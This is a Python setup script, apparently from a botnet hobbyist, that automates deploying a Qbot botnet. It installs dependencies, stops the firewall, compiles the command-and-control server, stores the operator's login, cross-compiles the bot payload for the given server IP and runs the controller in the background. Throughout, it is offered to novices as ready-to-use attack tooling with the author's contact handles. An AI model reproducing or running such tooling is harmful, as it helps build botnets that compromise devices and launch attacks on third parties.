#!/usr/bin/python																																																																																																#cc8d853da9dc58585041e7316d12c1e9

#   charge./switch's botnet helper
#   for the kiddos
#   contact: charge.#6660
#   website: theswitcharchive.com
#   IG: @switchnets


#import some hacks
import subprocess, time, sys, random


def run(cmd):
   subprocess.call(cmd, shell=True) # subprocess call so we can run hacker commands in the vps 
run('clear') # clear the screen :hahayes:

print("Starting...")
time.sleep(2)
cncport = raw_input("What do you want your Botnet Port to be? (1337, 666, 420, whatever): ")
print("noted")
time.sleep(1)
print
print("INSTALLING DEPENDENCIES")
print
run('yum install gcc screen nano httpd python perl -y; ulimit -n 99999')
print
print("STOPPING IPTABLES")
print
run('iptables -F; service iptables stop')
print
print("COMPILING SERVERSIDE")
print
run('gcc cnc.c -o cnc -pthread')
print
usernamelol = raw_input("What do you want your Botnet Username to be?: ")
passwordlol = raw_input("What do you want your Botnet Password to be?: ")
run('echo '+usernamelol+ ' ' +passwordlol+ ' >> login.txt')
whatsurip = raw_input("Please enter your server IP: ")
print
print("CROSS COMPILING, PRESS Y THEN ENTER WHEN IT ASKS TO 'Get Arch's?'")
print
run('python cc.py bot.c '+whatsurip)
print
print("CROSS COMPILING FINISHED, PLEASE SAVE YOUR PAYLOAD! YOU HAVE 20 SECONDS")
print
time.sleep(20)
print
print("SCREENING CNC IN 10 SECONDS, WHEN THE SCREEN GOES BLACK, DETACH WITH CTRL A+D")
time.sleep(10)
run('screen ./cnc 23 1 '+cncport)
time.sleep(1)
print
print("")
print("Done, your switchware Qbot is screened, here is all the info you need:")
print("Server IP: " +whatsurip)
print("Botnet Username: " +usernamelol)
print("Botnet Password: " +passwordlol)
print("CNCPort: " +cncport)
print
print("Thanks for using, made by switch")
print("If you have any issues, message me on Discord: childish.#7964")